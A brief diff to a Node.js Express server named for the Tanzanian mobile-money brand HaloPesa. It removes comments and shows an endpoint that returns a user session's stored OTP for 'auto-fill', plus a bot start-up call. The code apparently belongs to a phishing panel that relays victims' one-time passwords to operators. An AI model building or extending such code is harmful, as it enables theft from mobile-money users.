@@ -1,6 +1,5 @@
 /**
  * **HALOPESA TANZANIA - SECURE MULTI-ADMIN SERVER**
- * Fixed status endpoint to include 'otp' for auto-fill and correct routing.
  */
 
 const express = require('express');
@@ -380,7 +379,6 @@ app.get('/api/check-status/:userId', (req, res) => {
   const { userId } = req.params;
   const session = sessions.get(userId);
   if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
-  // FIXED: Include 'otp' field in response so autofill works correctly
   res.status(200).json({ status: session.status, otp: session.otp || '' });
 });
 
@@ -452,4 +450,4 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
-    
+                                  
